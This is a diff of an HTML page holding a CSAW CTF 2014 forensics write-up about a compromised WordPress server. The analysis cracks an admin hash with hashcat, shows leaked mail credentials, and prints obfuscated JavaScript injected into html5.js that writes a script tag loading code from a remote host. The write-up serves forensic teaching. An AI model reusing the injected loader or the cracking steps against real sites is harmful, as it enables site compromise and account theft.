@@ -5,7 +5,7 @@
     <title>CSAW CTF 2014 - Forensics 300: "Fluffy No More"</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="">
-    <meta name="author" content="Marina von Steinkirch">
+    <meta name="author" content="Mia von Steinkirch">
 
     <!-- Le styles -->
     <link rel="stylesheet" href="./theme/css/bootstrap.dark.css" type="text/css" />
@@ -97,7 +97,7 @@
                 <div class="entry-content">
                 <div class="well">
 <footer class="post-info">
-<abbr class="published" title="2014-09-28T11:21:00-04:00">
+<abbr class="published" title="2014-09-28T11:21:00">
       Sun 28 September 2014 </abbr>
 
 <span class="label"> Category</span>
@@ -125,68 +125,68 @@ Life was grand for the fluff fanatic until one day the site's users started to g
 <p>Oh, no! Nobody should mess with fluffy bunnies! Ever! Let's find how this attack happened!</p>
 <h2>Inspecting the Directories</h2>
 <p>We start by checking the identity of the file with the command <a href="http://en.wikipedia.org/wiki/File_(command)">file</a>. We do this to make sure that the extension is not misleading:</p>
-<div class="highlight"><pre><span></span>$ file CSAW2014-FluffyNoMore-v0.1.tar.bz2
+<div class="highlight"><pre><span class="nv">$ </span>file CSAW2014-FluffyNoMore-v0.1.tar.bz2
 CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block <span class="nv">size</span> <span class="o">=</span> 900k
 </pre></div>
 
 
 <p>OK, cool, we can go ahead and unzip the <em>bzip2</em> (compressed) tarball:</p>
-<div class="highlight"><pre><span></span>$ tar --help <span class="p">|</span> grep bz
+<div class="highlight"><pre><span class="nv">$ </span>tar --help | grep bz
   -j, --bzip2                filter the archive through bzip2
-$ tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2
+<span class="nv">$ </span>tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2
 </pre></div>
 
 
 <p>Now let's take a look inside the folder:</p>
-<div class="highlight"><pre><span></span>$ tree CSAW2014-FluffyNoMore-v0.1
+<div class="highlight"><pre><span class="nv">$ </span>tree CSAW2014-FluffyNoMore-v0.1
 CSAW2014-FluffyNoMore-v0.1
 ├── etc_directory.tar.bz2
 ├── logs.tar.bz2
 ├── mysql_backup.sql.bz2
 └── webroot.tar.bz2
 
-<span class="m">0</span> directories, <span class="m">4</span> files
+0 directories, 4 files
 </pre></div>
 
 
 <p>All right, 4 more tarballs. Unziping and organizing them give us the following directories:</p>
-<div class="highlight"><pre><span></span>- etc/
-- var/log and var/www
-- mysql_backup.sql ([MySQL database dump file])
+<div class="highlight"><pre><span class="o">-</span> <span class="n">etc</span><span class="o">/</span>
+<span class="o">-</span> <span class="n">var</span><span class="o">/</span><span class="n">log</span> <span class="n">and</span> <span class="n">var</span><span class="o">/</span><span class="n">www</span>
+<span class="o">-</span> <span class="n">mysql_backup</span><span class="p">.</span><span class="n">sql</span> <span class="p">([</span><span class="n">MySQL</span> <span class="n">database</span> <span class="n">dump</span> <span class="n">file</span><span class="p">])</span>
 </pre></div>
 
 
 <p>This is the directory structure of a  <a href="https://coderwall.com/p/syyk0g?i=5&amp;p=1&amp;q=author%3Abt3gl&amp;t%5B%5D=bt3gl">LAMP server</a>, where LAMP stands for Linux-Apache-MySQL-PHP in the <a href="http://www.tldp.org/LDP/intro-linux/html/sect_03_01.html">Linux File System</a>. In this framework, the PHP/HTML/JavaScript webpage is placed inside <code>var/www</code>.</p>
 <p>The directory <code>var/</code> contains files that are expected to change in size and content as the system is running (var stands for variable). So it is natural that system log files are generally placed at <code>/var/log</code>.</p>
 <p>Finally, the <code>etc/</code> directory contains the system configuration files. For example, the file <code>resolv.conf</code> tells the system where to go on the network to obtain host name to IP address mappings (DNS). Another example is the file  <code>passwd</code>, which stores login information.</p>
-<hr>
+<hr />
 <h2>Before Anything else...</h2>
 <p>OK, based on the previous challenges, we need to give a try:</p>
-<div class="highlight"><pre><span></span>$ grep -r -l <span class="s2">&quot;key{&quot;</span>
+<div class="highlight"><pre><span class="nv">$ </span>grep -r -l <span class="s2">&quot;key{&quot;</span>
 var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 
-$ grep -r -l <span class="s2">&quot;flag{&quot;</span>
+<span class="nv">$ </span>grep -r -l <span class="s2">&quot;flag{&quot;</span>
 var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 </pre></div>
 
 
 <p>Is our life this easy??? No, of course not. The hits we got are just funny names to mislead us, for example:</p>
-<div class="highlight"><pre><span></span> -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px
+<div class="highlight"><pre> -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px
 </pre></div>
 
 
-<hr>
+<hr />
 <h2>Analyzing the MySQL Dump File</h2>
 <p>Let's start taking a look at <code>mysql_backup.sql</code>.</p>
 <p>Of course, no luck for:</p>
-<div class="highlight"><pre><span></span>$ cat mysql_backup.sql <span class="p">|</span> grep <span class="s1">&#39;flag{&#39;</span>
+<div class="highlight"><pre><span class="nv">$ </span>cat mysql_backup.sql | grep <span class="s1">&#39;flag{&#39;</span>
 </pre></div>
 
 
 <p>Fine. We open <code>mysql_backup.sql</code> in a text editor. The comments table shows that someone named "hacker" made an appearance:</p>
-<div class="highlight"><pre><span></span><span class="c1">-- MySQL dump 10.13  Distrib 5.5.38, for debian-linux-gnu (i686)</span>
+<div class="highlight"><pre><span class="c1">-- MySQL dump 10.13  Distrib 5.5.38, for debian-linux-gnu (i686)</span>
 <span class="c1">--</span>
 <span class="c1">-- Host: localhost    Database: wordpress</span>
 <span class="c1">-- ------------------------------------------------------</span>
@@ -205,32 +205,32 @@ webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/include
 
 
 <p>Searching for the host <strong>secretspace.com</strong> leads to some generic website. Inspecting its source code does not give us any hint either. Maybe its IP address?</p>
-<div class="highlight"><pre><span></span>$ dig secretspace.com
+<div class="highlight"><pre><span class="nv">$ </span>dig secretspace.com
 
-<span class="p">;</span> &lt;&lt;&gt;&gt; DiG <span class="m">9</span>.9.4-P2-RedHat-9.9.4-15.P2.fc20 &lt;&lt;&gt;&gt; secretspace.com
-<span class="p">;;</span> global options: +cmd
-<span class="p">;;</span> Got answer:
-<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">61131</span>
-<span class="p">;;</span> flags: qr rd ra ad<span class="p">;</span> QUERY: <span class="m">1</span>, ANSWER: <span class="m">1</span>, AUTHORITY: <span class="m">0</span>, ADDITIONAL: <span class="m">0</span>
+; &lt;&lt;&gt;&gt; DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 &lt;&lt;&gt;&gt; secretspace.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: 61131
+;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
 
-<span class="p">;;</span> QUESTION SECTION:
-<span class="p">;</span>secretspace.com.       IN  A
+;; QUESTION SECTION:
+;secretspace.com.       IN  A
 
-<span class="p">;;</span> ANSWER SECTION:
-secretspace.com.    <span class="m">285</span> IN  A   <span class="m">72</span>.167.232.29
+;; ANSWER SECTION:
+secretspace.com.    285 IN  A   72.167.232.29
 
-<span class="p">;;</span> Query time: <span class="m">7</span> msec
-<span class="p">;;</span> SERVER: <span class="m">10</span>.0.0.1#53<span class="o">(</span><span class="m">10</span>.0.0.1<span class="o">)</span>
-<span class="p">;;</span> WHEN: Thu Sep <span class="m">25</span> <span class="m">15</span>:51:26 EDT <span class="m">2014</span>
-<span class="p">;;</span> MSG SIZE  rcvd: <span class="m">49</span>
+;; Query <span class="nb">time</span>: 7 msec
+;; SERVER: 10.0.0.1#53<span class="o">(</span>10.0.0.1<span class="o">)</span>
+;; WHEN: Thu Sep 25 15:51:26 EDT 2014
+;; MSG SIZE  rcvd: 49
 </pre></div>
 
 
 <p>The IP 72.167.232.29  leads to another generic page with no hints and with nothing in special in the source code. Wrong direction...</p>
 <p>All right, let's give a last try and open the tables from the MySQL dump file inside a nice GUI. I use <a href="http://www.phpmyadmin.net/home_page/index.php">phpMyAdmin</a>, which I showed how to install and to configure in my tutorial about setting up a <a href="https://coderwall.com/p/syyk0g?i=5&amp;p=1&amp;q=author%3Abt3gl&amp;t%5B%5D=bt3gl">LAMP server</a>.</p>
 <p>We open <code>localhost/phpmyadmin</code> in our browser. First we go  to <em>Databases</em> and then <em>Create Database</em> with any name we want. Then we  <em>Import</em> <code>`mysql_backup.sql</code> to this database. All the tables are loaded. Let's use the <em>Search</em> option to look for <em>key</em> or <em>flag</em>.</p>
-<p><img alt="" src="http://i.imgur.com/tVOY1VJ.png">
-<img alt="" src="http://i.imgur.com/jY7CbLZ.png"></p>
+<p><img alt="" src="http://i.imgur.com/tVOY1VJ.png" />
+<img alt="" src="http://i.imgur.com/jY7CbLZ.png" /></p>
 <p>Nope. Nothing in special. By the way, <code>`default_pingback_flag1</code> is just a <strong>Wordpress</strong> flag indicating the default status of ping backs when new blog posts are published.</p>
 <p>Let's continue our search. If we look  inside each of the tables we find:</p>
 <ul>
@@ -239,70 +239,70 @@ secretspace.com.    <span class="m">285</span> IN  A   <span class="m">72</span>
 </li>
 <li>
 <p>Oh, wait! We found a hashed password!
-<img alt="" src="http://i.imgur.com/FiQONze.png"></p>
+<img alt="" src="http://i.imgur.com/FiQONze.png" /></p>
 </li>
 </ul>
-<hr>
+<hr />
 <h2>Cracking the Password</h2>
 <p>We want to crack <code>$P$BmHbpWPZrjt.2V8T2xDJfbDrAJZ9So1</code> and for this we are going to use <a href="http://hashcat.net/hashcat/">hashcat</a>. If you are in <a href="http://www.kali.org/">Kali</a> or in any Debian distribution you can install it with:</p>
-<div class="highlight"><pre><span></span>$ apt-get hashcat
+<div class="highlight"><pre><span class="nv">$ </span>apt-get hashcat
 </pre></div>
 
 
 <p>In Fedora, we need to download and unzip it:</p>
-<div class="highlight"><pre><span></span>$ wget http://hashcat.net/files/hashcat-0.47.7z
-$ 7za e hashcat-0.47.7z
+<div class="highlight"><pre><span class="nv">$ </span>wget http://hashcat.net/files/hashcat-0.47.7z
+<span class="nv">$ </span>7za e hashcat-0.47.7z
 </pre></div>
 
 
 <p>Now, we are going to perform a brute force attack so we need a list of passwords. If you are using Kali, you can find them with:</p>
-<div class="highlight"><pre><span></span>$ locate wordlist
+<div class="highlight"><pre><span class="nv">$ </span>locate wordlist
 </pre></div>
 
 
 <p>If not, this is an example for you (it's always good to have several lists!):</p>
-<div class="highlight"><pre><span></span>$ wget http://www.scovetta.com/download/500_passwords.txt
-$ head 500_passwords.txt
-<span class="m">123456</span>
+<div class="highlight"><pre><span class="nv">$ </span>wget http://www.scovetta.com/download/500_passwords.txt
+<span class="nv">$ </span>head 500_passwords.txt
+123456
 password
-<span class="m">12345678</span>
-<span class="m">1234</span>
-<span class="m">12345</span>
+12345678
+1234
+12345
 dragon
 qwerty
-<span class="m">696969</span>
+696969
 mustang
 </pre></div>
 
 
 <p>Hashcat is awesome because it gives you a list of hash types:</p>
-<div class="highlight"><pre><span></span>    0 = MD5
-   10 = md5($pass.$salt)
-   20 = md5($salt.$pass)
-   30 = md5(unicode($pass).$salt)
-   40 = md5(unicode($pass).$salt)
-   50 = HMAC-MD5 (key = $pass)
-   60 = HMAC-MD5 (key = $salt)
-  100 = SHA1
-  110 = sha1($pass.$salt)
-  120 = sha1($salt.$pass)
-  130 = sha1(unicode($pass).$salt)
-  140 = sha1($salt.unicode($pass))
-  150 = HMAC-SHA1 (key = $pass)
-  160 = HMAC-SHA1 (key = $salt)
-  200 = MySQL
-  300 = MySQL4.1/MySQL5
-  400 = phpass, MD5(Wordpress), MD5(phpBB3)
-  500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5
-  800 = SHA-1(Django)
-  (...)
+<div class="highlight"><pre>    <span class="mi">0</span> <span class="o">=</span> <span class="n">MD5</span>
+   <span class="mi">10</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="err">$</span><span class="n">pass</span><span class="p">.</span><span class="err">$</span><span class="n">salt</span><span class="p">)</span>
+   <span class="mi">20</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="err">$</span><span class="n">salt</span><span class="p">.</span><span class="err">$</span><span class="n">pass</span><span class="p">)</span>
+   <span class="mi">30</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">unicode</span><span class="p">(</span><span class="err">$</span><span class="n">pass</span><span class="p">).</span><span class="err">$</span><span class="n">salt</span><span class="p">)</span>
+   <span class="mi">40</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">unicode</span><span class="p">(</span><span class="err">$</span><span class="n">pass</span><span class="p">).</span><span class="err">$</span><span class="n">salt</span><span class="p">)</span>
+   <span class="mi">50</span> <span class="o">=</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="p">(</span><span class="n">key</span> <span class="o">=</span> <span class="err">$</span><span class="n">pass</span><span class="p">)</span>
+   <span class="mi">60</span> <span class="o">=</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="p">(</span><span class="n">key</span> <span class="o">=</span> <span class="err">$</span><span class="n">salt</span><span class="p">)</span>
+  <span class="mi">100</span> <span class="o">=</span> <span class="n">SHA1</span>
+  <span class="mi">110</span> <span class="o">=</span> <span class="n">sha1</span><span class="p">(</span><span class="err">$</span><span class="n">pass</span><span class="p">.</span><span class="err">$</span><span class="n">salt</span><span class="p">)</span>
+  <span class="mi">120</span> <span class="o">=</span> <span class="n">sha1</span><span class="p">(</span><span class="err">$</span><span class="n">salt</span><span class="p">.</span><span class="err">$</span><span class="n">pass</span><span class="p">)</span>
+  <span class="mi">130</span> <span class="o">=</span> <span class="n">sha1</span><span class="p">(</span><span class="n">unicode</span><span class="p">(</span><span class="err">$</span><span class="n">pass</span><span class="p">).</span><span class="err">$</span><span class="n">salt</span><span class="p">)</span>
+  <span class="mi">140</span> <span class="o">=</span> <span class="n">sha1</span><span class="p">(</span><span class="err">$</span><span class="n">salt</span><span class="p">.</span><span class="n">unicode</span><span class="p">(</span><span class="err">$</span><span class="n">pass</span><span class="p">))</span>
+  <span class="mi">150</span> <span class="o">=</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">SHA1</span> <span class="p">(</span><span class="n">key</span> <span class="o">=</span> <span class="err">$</span><span class="n">pass</span><span class="p">)</span>
+  <span class="mi">160</span> <span class="o">=</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">SHA1</span> <span class="p">(</span><span class="n">key</span> <span class="o">=</span> <span class="err">$</span><span class="n">salt</span><span class="p">)</span>
+  <span class="mi">200</span> <span class="o">=</span> <span class="n">MySQL</span>
+  <span class="mi">300</span> <span class="o">=</span> <span class="n">MySQL4</span><span class="mf">.1</span><span class="o">/</span><span class="n">MySQL5</span>
+  <span class="mi">400</span> <span class="o">=</span> <span class="n">phpass</span><span class="p">,</span> <span class="n">MD5</span><span class="p">(</span><span class="n">Wordpress</span><span class="p">),</span> <span class="n">MD5</span><span class="p">(</span><span class="n">phpBB3</span><span class="p">)</span>
+  <span class="mi">500</span> <span class="o">=</span> <span class="n">md5crypt</span><span class="p">,</span> <span class="n">MD5</span><span class="p">(</span><span class="n">Unix</span><span class="p">),</span> <span class="n">FreeBSD</span> <span class="n">MD5</span><span class="p">,</span> <span class="n">Cisco</span><span class="o">-</span><span class="n">IOS</span> <span class="n">MD5</span>
+  <span class="mi">800</span> <span class="o">=</span> <span class="n">SHA</span><span class="o">-</span><span class="mi">1</span><span class="p">(</span><span class="n">Django</span><span class="p">)</span>
+  <span class="p">(...)</span>
 </pre></div>
 
 
 <p>We choose 400 because we are dealing with Wordpress. We copy and paste the hash to a file <em>pass.hash</em>. Then, we run:</p>
-<div class="highlight"><pre><span></span>$ ./hashcat-cli64.bin -m <span class="m">400</span> -a <span class="m">0</span> -o cracked.txt --remove  pass.hash word_list.txt
+<div class="highlight"><pre><span class="nv">$ </span>./hashcat-cli64.bin -m 400 -a 0 -o cracked.txt --remove  pass.hash word_list.txt
 
-Initializing hashcat v0.47 by atom with <span class="m">8</span> threads and 32mb segment-size...
+Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...
 <span class="o">(</span>...<span class="o">)</span>
 </pre></div>
 
@@ -315,7 +315,7 @@ Initializing hashcat v0.47 by atom with <span class="m">8</span> threads and 32m
 <li>word_list.txt is our dictionary</li>
 </ul>
 <p>Now let's take a peak in the output file:</p>
-<div class="highlight"><pre><span></span>$ cat cracked.txt
+<div class="highlight"><pre><span class="nv">$ </span>cat cracked.txt
 <span class="nv">$P$BmHbpWPZrjt</span>.2V8T2xDJfbDrAJZ9So1:fluffybunnies
 </pre></div>
 
@@ -340,10 +340,10 @@ Initializing hashcat v0.47 by atom with <span class="m">8</span> threads and 32m
 </ul>
 <p>Ah,  also that <code>mailserver_login:login@example.com</code> and <code>mailserver_pass=password</code>. Talking about security...</p>
 <p>Let's move on.</p>
-<hr>
+<hr />
 <h2>Inspecting /var/logs/apache2</h2>
 <p>The next item in the list is log inspection. We need wisely choose where to start because there are many of them:</p>
-<div class="highlight"><pre><span></span>$ find . -type f  -name <span class="s1">&#39;*.log&#39;</span>
+<div class="highlight"><pre><span class="nv">$ </span>find . -type f  -name <span class="s1">&#39;*.log&#39;</span>
 ./apache2/error.log
 ./apache2/access.log
 ./apache2/other_vhosts_access.log
@@ -381,13 +381,13 @@ Initializing hashcat v0.47 by atom with <span class="m">8</span> threads and 32m
 
 <p>We start with the Apache's log, because they carry the connection information. If there is any important information in the log files, it should appears in the end, because the attack should be one of the last things that were logged.</p>
 <p>It turned out that <a href="http://en.wikipedia.org/wiki/Tail_(Unix)">Tailing</a> the <em>apache</em> logs did not reveal anything useful.</p>
-<hr>
+<hr />
 <h2>Inspecting var/logs/auth.log</h2>
 <p>Considering that the password <strong>fluffybunnies</strong> was very easy to guess, we are going to take a leap and suppose that this was how the attack was crafted.</p>
 <p>Tailing <code>auth.log</code> shows something interesting:</p>
-<div class="highlight"><pre><span></span>Sep <span class="m">17</span> <span class="m">19</span>:18:53 ubuntu sudo:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu/CSAW2014-WordPress/var/www <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/bin/chmod -R <span class="m">775</span> /var/www/
-Sep <span class="m">17</span> <span class="m">19</span>:20:09 ubuntu sudo:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu/CSAW2014-WordPress/var/www <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
-Sep <span class="m">17</span> <span class="m">19</span>:20:55 ubuntu sudo:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu/CSAW2014-WordPress/var/www <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/find /var/www/html/ * touch <span class="o">{}</span>
+<div class="highlight"><pre>Sep 17 19:18:53 ubuntu sudo:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 ; <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu/CSAW2014-WordPress/var/www ; <span class="nv">USER</span><span class="o">=</span>root ; <span class="nv">COMMAND</span><span class="o">=</span>/bin/chmod -R 775 /var/www/
+Sep 17 19:20:09 ubuntu sudo:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 ; <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu/CSAW2014-WordPress/var/www ; <span class="nv">USER</span><span class="o">=</span>root ; <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
+Sep 17 19:20:55 ubuntu sudo:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 ; <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu/CSAW2014-WordPress/var/www ; <span class="nv">USER</span><span class="o">=</span>root ; <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/find /var/www/html/ * touch <span class="o">{}</span>
 </pre></div>
 
 
@@ -400,41 +400,41 @@ Sep <span class="m">17</span> <span class="m">19</span>:20:55 ubuntu sudo:   ubu
 <p>modified a JavaScript file (html5.js) in <em>vi</em>.</p>
 </li>
 </ol>
-<hr>
+<hr />
 <h2>Finding the JavaScript Exploit</h2>
 <p>It looks like an attack to me! Let's <a href="http://linux.die.net/man/1/diff">diff</a> this JavaScript file with the original (<a href="http://phpxref.ftwr.co.uk/wordpress/wp-content/themes/twentythirteen/js/html5.js.source.html">which we can just google</a>):</p>
-<div class="highlight"><pre><span></span>$ diff html5.js html5_normal.js
-<span class="m">93</span>,122d92
-&lt; var <span class="nv">g</span> <span class="o">=</span> <span class="s2">&quot;ti&quot;</span><span class="p">;</span>
-&lt; var <span class="nv">c</span> <span class="o">=</span> <span class="s2">&quot;HTML Tags&quot;</span><span class="p">;</span>
-&lt; var <span class="nv">f</span> <span class="o">=</span> <span class="s2">&quot;. li colgroup br src datalist script option .&quot;</span><span class="p">;</span>
-&lt; <span class="nv">f</span> <span class="o">=</span> f.split<span class="o">(</span><span class="s2">&quot; &quot;</span><span class="o">)</span><span class="p">;</span>
-&lt; <span class="nv">c</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
-&lt; <span class="nv">k</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
-&lt; <span class="nv">m</span> <span class="o">=</span> f<span class="o">[</span><span class="m">6</span><span class="o">]</span><span class="p">;</span>
-&lt; <span class="k">for</span> <span class="o">(</span>var <span class="nv">i</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span> i &lt; f.length<span class="p">;</span> i++<span class="o">)</span> <span class="o">{</span>
-&lt;     <span class="nv">c</span> <span class="o">+=</span> f<span class="o">[</span>i<span class="o">]</span>.length.toString<span class="o">()</span><span class="p">;</span>
+<div class="highlight"><pre><span class="nv">$ </span>diff html5.js html5_normal.js
+93,122d92
+&lt; var <span class="nv">g</span> <span class="o">=</span> <span class="s2">&quot;ti&quot;</span>;
+&lt; var <span class="nv">c</span> <span class="o">=</span> <span class="s2">&quot;HTML Tags&quot;</span>;
+&lt; var <span class="nv">f</span> <span class="o">=</span> <span class="s2">&quot;. li colgroup br src datalist script option .&quot;</span>;
+&lt; <span class="nv">f</span> <span class="o">=</span> f.split<span class="o">(</span><span class="s2">&quot; &quot;</span><span class="o">)</span>;
+&lt; <span class="nv">c</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>;
+&lt; <span class="nv">k</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span>;
+&lt; <span class="nv">m</span> <span class="o">=</span> f<span class="o">[</span>6<span class="o">]</span>;
+&lt; <span class="k">for</span> <span class="o">(</span>var <span class="nv">i</span> <span class="o">=</span> 0; i &lt; f.length; i++<span class="o">)</span> <span class="o">{</span>
+&lt;     c +<span class="o">=</span> f<span class="o">[</span>i<span class="o">]</span>.length.toString<span class="o">()</span>;
 &lt; <span class="o">}</span>
-&lt; <span class="nv">v</span> <span class="o">=</span> f<span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="p">;</span>
-&lt; <span class="nv">x</span> <span class="o">=</span> <span class="s2">&quot;\&#39;ht&quot;</span><span class="p">;</span>
-&lt; <span class="nv">b</span> <span class="o">=</span> f<span class="o">[</span><span class="m">4</span><span class="o">]</span><span class="p">;</span>
-&lt; <span class="nv">f</span> <span class="o">=</span> <span class="m">2541</span> * <span class="m">6</span> - <span class="m">35</span> + <span class="m">46</span> + <span class="m">12</span> - <span class="m">15269</span><span class="p">;</span>
-&lt; <span class="nv">c</span> <span class="o">+=</span> f.toString<span class="o">()</span><span class="p">;</span>
-&lt; <span class="nv">f</span> <span class="o">=</span> <span class="o">(</span><span class="m">56</span> + <span class="m">31</span> + <span class="m">68</span> * <span class="m">65</span> + <span class="m">41</span> - <span class="m">548</span><span class="o">)</span> / <span class="m">4000</span> - <span class="m">1</span><span class="p">;</span>
-&lt; <span class="nv">c</span> <span class="o">+=</span> f.toString<span class="o">()</span><span class="p">;</span>
-&lt; <span class="nv">f</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
-&lt; <span class="nv">c</span> <span class="o">=</span> c.split<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span><span class="p">;</span>
-&lt; var <span class="nv">w</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>
-&lt; <span class="nv">u</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;</span>
-&lt; <span class="k">for</span> <span class="o">(</span>var <span class="nv">i</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span> i &lt; c.length<span class="p">;</span> i++<span class="o">)</span> <span class="o">{</span>
-&lt;     <span class="k">if</span> <span class="o">(((</span><span class="nv">i</span> <span class="o">==</span> <span class="m">3</span> <span class="o">||</span> <span class="nv">i</span> <span class="o">==</span> <span class="m">6</span><span class="o">)</span> <span class="o">&amp;&amp;</span> w !<span class="o">=</span> <span class="m">2</span><span class="o">)</span> <span class="o">||</span> <span class="o">((</span><span class="nv">i</span> <span class="o">==</span> <span class="m">8</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="nv">w</span> <span class="o">==</span> <span class="m">2</span><span class="o">))</span> <span class="o">{</span>
-&lt;         <span class="nv">f</span> <span class="o">+=</span> String.fromCharCode<span class="o">(</span><span class="m">46</span><span class="o">)</span><span class="p">;</span>
-&lt;         w++<span class="p">;</span>
+&lt; <span class="nv">v</span> <span class="o">=</span> f<span class="o">[</span>0<span class="o">]</span>;
+&lt; <span class="nv">x</span> <span class="o">=</span> <span class="s2">&quot;\&#39;ht&quot;</span>;
+&lt; <span class="nv">b</span> <span class="o">=</span> f<span class="o">[</span>4<span class="o">]</span>;
+&lt; <span class="nv">f</span> <span class="o">=</span> 2541 * 6 - 35 + 46 + 12 - 15269;
+&lt; c +<span class="o">=</span> f.toString<span class="o">()</span>;
+&lt; <span class="nv">f</span> <span class="o">=</span> <span class="o">(</span>56 + 31 + 68 * 65 + 41 - 548<span class="o">)</span> / 4000 - 1;
+&lt; c +<span class="o">=</span> f.toString<span class="o">()</span>;
+&lt; <span class="nv">f</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>;
+&lt; <span class="nv">c</span> <span class="o">=</span> c.split<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>;
+&lt; var <span class="nv">w</span> <span class="o">=</span> 0;
+&lt; <span class="nv">u</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span>;
+&lt; <span class="k">for</span> <span class="o">(</span>var <span class="nv">i</span> <span class="o">=</span> 0; i &lt; c.length; i++<span class="o">)</span> <span class="o">{</span>
+&lt;     <span class="k">if</span> <span class="o">(((</span><span class="nv">i</span> <span class="o">==</span> 3 <span class="o">||</span> <span class="nv">i</span> <span class="o">==</span> 6<span class="o">)</span> <span class="o">&amp;&amp;</span> w !<span class="o">=</span> 2<span class="o">)</span> <span class="o">||</span> <span class="o">((</span><span class="nv">i</span> <span class="o">==</span> 8<span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="nv">w</span> <span class="o">==</span> 2<span class="o">))</span> <span class="o">{</span>
+&lt;         f +<span class="o">=</span> String.fromCharCode<span class="o">(</span>46<span class="o">)</span>;
+&lt;         w++;
 &lt;     <span class="o">}</span>
-&lt;     <span class="nv">f</span> <span class="o">+=</span> c<span class="o">[</span>i<span class="o">]</span><span class="p">;</span>
+&lt;     f +<span class="o">=</span> c<span class="o">[</span>i<span class="o">]</span>;
 &lt; <span class="o">}</span>
-&lt; <span class="nv">i</span> <span class="o">=</span> k + <span class="s2">&quot;anal&quot;</span><span class="p">;</span>
-&lt; document.write<span class="o">(</span><span class="s2">&quot;&lt;&quot;</span> + m + <span class="s2">&quot; &quot;</span> + b + <span class="s2">&quot;=&quot;</span> + x + <span class="s2">&quot;tp:&quot;</span> + k + k + f + i + <span class="s2">&quot;y&quot;</span> + g + <span class="s2">&quot;c&quot;</span> + u + v + <span class="s2">&quot;j&quot;</span> + u + <span class="s2">&quot;\&#39;&gt;\&lt;/&quot;</span> + m + <span class="s2">&quot;\&gt;&quot;</span><span class="o">)</span><span class="p">;</span>
+&lt; <span class="nv">i</span> <span class="o">=</span> k + <span class="s2">&quot;anal&quot;</span>;
